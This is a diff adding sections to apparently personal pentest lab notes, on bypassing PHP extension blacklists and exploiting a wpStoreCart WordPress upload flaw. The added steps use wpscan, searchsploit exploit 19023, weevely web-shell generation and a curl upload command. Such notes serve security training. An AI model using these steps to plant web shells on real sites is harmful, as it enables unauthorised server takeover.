@@ -34,3 +34,37 @@
 5. Do it automatically
   - Generate payload → ```weevely generate password ~/Desktop/weevely.jpg```
   - Attack against the url → ```weevely url password```
+
+### 7.3. Bypassing PHPx Blacklists
+
+1. Upload allowed (configuration in php can state which version of php is executed) → result is file is interpreted as plain text
+2. Use BS → send to repeater, change the name, check response
+3. In the headers → server is revealed, not php version
+4. Then, change php extension to this → php7
+5. When executing → code is executed now
+
+### 7.4. WordPress wpStoreCart File Upload 
+
+1. Start with an enumeration → copy the url 
+  - ```wpscan --url url``` 
+2. Check theme, version, plugins and upload directory listing → check url
+3. Search for exploits → ```searchsploit wpstorecart```
+4. Check the exploit
+  - Copy the file → ```cp /usr/share/exploitdb/exploits/phpwebapps/19023.php .```
+  - Inspect content → ```vim 19023.php```
+5. Copy the new url with the one from the lab → complete url from the result of searchsploit
+6. Copy the php payload → exploit.php
+7. Modify the name to match yours → full absolute path
+8. Give permissions to the file → ```chmod +x exploit.php```
+9. Install php → ```apt-get install php```
+10. Execute with → ```php -f exploit.php```
+11. Change script to be → ```curl_file_create(filename)``` instead of @name
+12. Execute the commands with the injection
+13. Using weevely → password generation allows to protect the file
+  - Command → ```weevely generate password ~/Desktop/login.php```
+  - Change the payload previous script with the new file generated
+  - Execute the script
+  - Copy the url when accessing
+  - Use it with weevely → ```weevely url password``
+  - Then you obtain the session
+14. Automate with curl → ```curl -F "Filedata=@./pathtofile.php" url```
